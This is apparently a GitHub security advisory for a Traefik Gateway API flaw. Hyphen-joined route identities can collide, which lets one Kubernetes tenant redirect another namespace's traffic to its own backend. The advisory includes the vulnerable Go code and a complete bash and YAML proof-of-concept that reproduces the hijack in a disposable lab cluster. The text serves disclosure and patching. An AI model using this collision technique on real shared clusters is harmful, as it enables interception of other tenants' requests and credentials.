# [H] Traefik: Gateway API route identity collision allows cross-namespace backend hijacking

## Summary
Severity: High
Advisory: GHSA-fgjj-px3w-67xx
CVE: CVE-2026-71327
CWE: CWE-694
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-08-06
Source: https://github.com/advisories/GHSA-fgjj-px3w-67xx
Type: github-advisory

## Affected
- Go: `github.com/traefik/traefik/v3` — affected >=3.0.0 <3.6.25
- Go: `github.com/traefik/traefik/v3` — affected >=3.7.0 <3.7.10

## Details
## Summary

There is a high severity vulnerability in Traefik's Kubernetes Gateway API provider. Router and service identities for `HTTPRoute`, `GRPCRoute`, `TCPRoute` and `TLSRoute` objects were built by hyphen-concatenating the route namespace, the route name, the Gateway identity, the entry point and the rule index, a construction that is not injective because Kubernetes names may themselves contain hyphens. Two distinct Routes attached to the same Gateway with equivalent match rules can therefore produce the same identity, and the Route loaded later silently overwrites the earlier one, so a tenant able to create an accepted Route in a colliding namespace/name combination can redirect another namespace's traffic to a backend it controls. All Traefik v3 minor lines are affected; the lines older than v3.6 are no longer maintained and will not receive a patch of their own, so users running them should upgrade to a maintained, patched release.

## Patches

- https://github.com/traefik/traefik/releases/tag/v3.6.25
- https://github.com/traefik/traefik/releases/tag/v3.7.10

## For more information

If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>

## Summary

Traefik's Kubernetes Gateway provider constructs internal HTTPRoute and
GRPCRoute identities by concatenating namespace, route name, Gateway identity,
entrypoint, and rule index with hyphens. Kubernetes names may themselves
contain hyphens, so the construction is not injective.

For example, HTTPRoutes `team/a-app` and `team-a/app`, attached to the same
Gateway with the same match rule, produce identical router and service keys.
During configuration merging, the route loaded later overwrites the earlier
route's maps. A tenant that can create an accepted Route in a colliding
namespace/name combination can therefore redirect another namespace's
traffic to an attacker-controlled backend.

The official v3.7.8 binary was reproduced returning the victim backend before
the second Route was created and the attacker backend immediately afterward.
The victim Route had the earlier creation timestamp and should win the
equivalent-match conflict under Gateway API precedence rules.

## Details

The HTTPRoute provider creates a route key as follows:

```go
routeKey := provider.Normalize(fmt.Sprintf(
	"%s-%s-%s-gw-%s-%s-ep-%s-%d",
	strings.ToLower(kindHTTPRoute),
	route.Namespace,
	route.Name,
	gatewayNamespace,
	gatewayName,
	listener.EPName,
	ri,
))
```

`Normalize` replaces non-alphanumeric runs with `-`, but it does not encode
field lengths or otherwise preserve component boundaries:

```go
func Normalize(name string) string {
	fargs := func(c rune) bool {
		return !unicode.IsLetter(c) && !unicode.IsNumber(c)
	}
	return strings.Join(strings.FieldsFunc(name, fargs), "-")
}
```

These distinct objects therefore have the same normalized key:

```text
namespace=team,   route=a-app
namespace=team-a, route=app

httproute-team-a-app-gw-gateway-shared-ep-web-0
```

`makeRouterName` adds a hash of the routing rule. When the attacker copies the
victim's hostname and path, that hash is also identical. Child service and
middleware names are derived from the same parent identity.

Each Route is built into a temporary configuration and then merged into the
provider-wide configuration with `maps.Copy`:

```go
maps.Copy(to.HTTP.Routers, from.HTTP.Routers)
maps.Copy(to.HTTP.Middlewares, from.HTTP.Middlewares)
maps.Copy(to.HTTP.Services, from.HTTP.Services)
maps.Copy(to.HTTP.ServersTransports, from.HTTP.ServersTransports)
```

`maps.Copy` replaces an existing value for a duplicate key. No collision is
reported, and the resulting router points to the later Route's backend. The
GRPCRoute implementation uses the same delimiter-free route-key format and
the same HTTP configuration merge path.

### Attack prerequisites

The attacker needs permission to create or modify an HTTPRoute or GRPCRoute
that the shared Gateway accepts. Exploitation also requires namespace and
Route names whose concatenation collides with a victim. The attacker does not
need permission to read or modify the victim Route, Service, or namespace.

## Proof of Concept

Prerequisites:

- a disposable Kubernetes cluster with Gateway API v1.5.1 experimental CRDs;
- `kubectl` configured for that cluster;
- curl;
- local TCP port 18080 available.

The following script embeds all objects used by the reproduction. It runs the
official `traefik:v3.7.8` image, creates the victim Route first, verifies the
victim backend, then creates the colliding attacker Route and repeats the
request.

```bash
#!/usr/bin/env bash
set -euo pipefail

kubectl apply -f - <<'YAML'
apiVersion: v1
kind: Namespace
metadata:
  name: gateway
---
apiVersion: v1
kind: Namespace
metadata:
  name: team
---
apiVersion: v1
kind: Namespace
metadata:
  name: team-a
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: traefik-audit
  namespace: gateway
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: traefik-route-collision-lab
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: traefik-audit
  namespace: gateway
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: traefik-audit
  namespace: gateway
spec:
  replicas: 1
  selector:
    matchLabels:
      app: traefik-audit
  template:
    metadata:
      labels:
        app: traefik-audit
    spec:
      serviceAccountName: traefik-audit
      containers:
      - name: traefik
        image: traefik:v3.7.8
        args:
        - --entryPoints.web.address=:8000
        - --providers.kubernetesgateway=true
        - --global.checkNewVersion=false
        - --global.sendAnonymousUsage=false
        - --log.level=ERROR
        ports:
        - name: web
          containerPort: 8000
---
apiVersion: gateway.networking.k8s.io/v1
kind: GatewayClass
metadata:
  name: traefik-route-collision-lab
spec:
  controllerName: traefik.io/gateway-controller
---
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: shared
  namespace: gateway
spec:
  gatewayClassName: traefik-route-collision-lab
  listeners:
  - name: web
    protocol: HTTP
    port: 8000
    allowedRoutes:
      namespaces:
        from: All
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: victim
  namespace: team
spec:
  replicas: 1
  selector:
    matchLabels:
      app: victim
  template:
    metadata:
      labels:
        app: victim
    spec:
      containers:
      - name: echo
        image: hashicorp/http-echo:1.0.0
        args: ["-listen=:5678", "-text=VICTIM_BACKEND"]
        ports:
        - containerPort: 5678
---
apiVersion: v1
kind: Service
metadata:
  name: backend
  namespace: team
spec:
  selector:
    app: victim
  ports:
  - port: 80
    targetPort: 5678
---
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: a-app
  namespace: team
spec:
  parentRefs:
  - name: shared
    namespace: gateway
  hostnames: ["collision.example"]
  rules:
  - matches:
    - path:
        type: PathPrefix
        value: /
    backendRefs:
    - name: backend
      port: 80
YAML

kubectl -n gateway rollout status deployment/traefik-audit --timeout=120s
kubectl -n team rollout status deployment/victim --timeout=120s

kubectl -n gateway port-forward deployment/traefik-audit 18080:8000 \
  >/dev/null 2>&1 &
PORT_FORWARD_PID=$!
trap 'kill "$PORT_FORWARD_PID" 2>/dev/null || true' EXIT

for _ in $(seq 1 60); do
  RESPONSE=$(curl -sS -H 'Host: collision.example' \
    http://127.0.0.1:18080/ 2>/dev/null || true)
  if [ "$RESPONSE" = "VICTIM_BACKEND" ]; then
    break
  fi
  sleep 1
done
printf 'before collision: %s\n' "$RESPONSE"

sleep 2

kubectl apply -f - <<'YAML'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: attacker
  namespace: team-a
spec:
  replicas: 1
  selector:
    matchLabels:
      app: attacker
  template:
    metadata:
      labels:
        app: attacker
    spec:
      containers:
      - name: echo
        image: hashicorp/http-echo:1.0.0
        args: ["-listen=:5678", "-text=ATTACKER_BACKEND"]
        ports:
        - containerPort: 5678
---
apiVersion: v1
kind: Service
metadata:
  name: backend
  namespace: team-a
spec:
  selector:
    app: attacker
  ports:
  - port: 80
    targetPort: 5678
YAML

kubectl -n team-a rollout status deployment/attacker --timeout=120s

kubectl apply -f - <<'YAML'
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: app
  namespace: team-a
spec:
  parentRefs:
  - name: shared
    namespace: gateway
  hostnames: ["collision.example"]
  rules:
  - matches:
    - path:
        type: PathPrefix
        value: /
    backendRefs:
    - name: backend
      port: 80
YAML

for _ in $(seq 1 60); do
  RESPONSE=$(curl -sS -H 'Host: collision.example' \
    http://127.0.0.1:18080/ 2>/dev/null || true)
  if [ "$RESPONSE" = "ATTACKER_BACKEND" ]; then
    break
  fi
  sleep 1
done
printf 'after collision:  %s\n' "$RESPONSE"

kubectl get httproute -A --sort-by=.metadata.creationTimestamp
```

Expected output on v3.7.8:

```text
before collision: VICTIM_BACKEND
after collision:  ATTACKER_BACKEND
NAMESPACE   NAME    HOSTNAMES
team        a-app   ["collision.example"]
team-a      app     ["collision.example"]
```

The first Route is older, but creating the second Route changes existing
victim traffic to the attacker backend. The same test was also run with the
official standalone v3.7.8 Linux amd64 binary inside an isolated k3s cluster.
The release archive had SHA-256
`dbd809b1de85d86d0718c80bedbaabd9aebaa3c6697f9e986ab5f387f4196cb7`.

## Impact

In a shared Gateway deployment, a Route author can hijack requests belonging
to another namespace when the object names admit a collision. Requests,
credentials, authorization headers, and response data can be delivered to an
attacker-controlled backend. The attacker can also return forged application
content or accept state-changing requests intended for the victim. The
favorable naming relationship and accepted shared Gateway are reflected in
the high attack-complexity rating.

</details>

---

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-fgjj-px3w-67xx
- https://github.com/traefik/traefik/pull/13580
- https://github.com/traefik/traefik/commit/a764166656f0cd337f917ac76315c381cca844f9
- https://github.com/traefik/traefik
- https://github.com/traefik/traefik/releases/tag/v3.6.25
- https://github.com/traefik/traefik/releases/tag/v3.7.10
